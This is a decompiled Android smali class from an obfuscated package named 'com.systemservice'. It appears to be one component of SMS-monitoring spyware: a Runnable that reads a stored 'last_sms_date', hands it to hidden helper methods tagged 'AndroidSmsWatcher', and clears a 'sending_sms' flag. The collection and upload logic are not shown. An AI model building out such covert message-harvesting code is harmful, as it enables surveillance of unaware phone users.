.class Lcom/systemservice/a/c/h/c;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/systemservice/a/c/h/g;->a(Lcom/systemservice/a/d/b;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Lcom/systemservice/a/d/b;

.field final synthetic b:Landroid/content/Context;

.field final synthetic c:Lcom/systemservice/a/c/h/g;


# direct methods
.method constructor <init>(Lcom/systemservice/a/c/h/g;Lcom/systemservice/a/d/b;Landroid/content/Context;)V
    .locals 0

    iput-object p1, p0, Lcom/systemservice/a/c/h/c;->c:Lcom/systemservice/a/c/h/g;

    iput-object p2, p0, Lcom/systemservice/a/c/h/c;->a:Lcom/systemservice/a/d/b;

    iput-object p3, p0, Lcom/systemservice/a/c/h/c;->b:Landroid/content/Context;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 11

    const-string v0, "smstestzz"

    const-string v1, "sending_sms"

    const-string v2, "AndroidSmsWatcher"

    const-string v3, "FINALLY SMS"

    const/4 v4, 0x0

    :try_start_0
    iget-object v5, p0, Lcom/systemservice/a/c/h/c;->c:Lcom/systemservice/a/c/h/g;

    iget-object v5, v5, Lcom/systemservice/a/d/g;->b:Lcom/systemservice/a/h/b;

    check-cast v5, Lcom/systemservice/a/h/k;

    invoke-virtual {v5, v4}, Lcom/systemservice/a/h/k;->a(I)V

    iget-object v6, p0, Lcom/systemservice/a/c/h/c;->c:Lcom/systemservice/a/c/h/g;

    invoke-static {v6}, Lcom/systemservice/a/c/h/g;->a(Lcom/systemservice/a/c/h/g;)Landroid/content/SharedPreferences;

    move-result-object v6

    const-string v7, "last_sms_date"

    const-wide/16 v8, 0x0

    invoke-interface {v6, v7, v8, v9}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v6

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "date_long = "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v6, v7}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v0, v8}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "date_long *1000 = "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-wide/16 v9, 0x1

    add-long/2addr v6, v9

    const-wide/16 v9, 0x3e8

    mul-long v6, v6, v9

    invoke-virtual {v8, v6, v7}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v0, v8}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v0, Ljava/util/Date;

    invoke-direct {v0, v6, v7}, Ljava/util/Date;-><init>(J)V

    iget-object v6, p0, Lcom/systemservice/a/c/h/c;->c:Lcom/systemservice/a/c/h/g;

    iget-object v7, p0, Lcom/systemservice/a/c/h/c;->a:Lcom/systemservice/a/d/b;

    check-cast v7, Lcom/systemservice/a/b/a;

    invoke-virtual {v7}, Lcom/systemservice/a/b/a;->a()Landroid/content/Context;

    move-result-object v7

    const/4 v8, 0x0

    invoke-static {v6, v7, v0, v8}, Lcom/systemservice/a/c/h/g;->a(Lcom/systemservice/a/c/h/g;Landroid/content/Context;Ljava/util/Date;Ljava/util/Date;)V

    iget-object v0, p0, Lcom/systemservice/a/c/h/c;->c:Lcom/systemservice/a/c/h/g;

    iget-object v6, p0, Lcom/systemservice/a/c/h/c;->b:Landroid/content/Context;

    invoke-static {v0, v6, v5}, Lcom/systemservice/a/c/h/g;->a(Lcom/systemservice/a/c/h/g;Landroid/content/Context;Lcom/systemservice/a/h/k;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_0

    :catchall_0
    move-exception v0

    goto :goto_1

    :catch_0
    move-exception v0

    :try_start_1
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, ""

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v2, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :goto_0
    invoke-static {v2, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v0, p0, Lcom/systemservice/a/c/h/c;->c:Lcom/systemservice/a/c/h/g;

    invoke-static {v0}, Lcom/systemservice/a/c/h/g;->b(Lcom/systemservice/a/c/h/g;)Lorg/apache/log4j/Logger;

    move-result-object v0

    invoke-virtual {v0, v3}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    iget-object v0, p0, Lcom/systemservice/a/c/h/c;->b:Landroid/content/Context;

    invoke-static {v0, v1, v4}, Lcom/systemservice/a/a/l;->b(Landroid/content/Context;Ljava/lang/String;Z)V

    return-void

    :goto_1
    invoke-static {v2, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v2, p0, Lcom/systemservice/a/c/h/c;->c:Lcom/systemservice/a/c/h/g;

    invoke-static {v2}, Lcom/systemservice/a/c/h/g;->b(Lcom/systemservice/a/c/h/g;)Lorg/apache/log4j/Logger;

    move-result-object v2

    invoke-virtual {v2, v3}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    iget-object v2, p0, Lcom/systemservice/a/c/h/c;->b:Landroid/content/Context;

    invoke-static {v2, v1, v4}, Lcom/systemservice/a/a/l;->b(Landroid/content/Context;Ljava/lang/String;Z)V

    throw v0
.end method
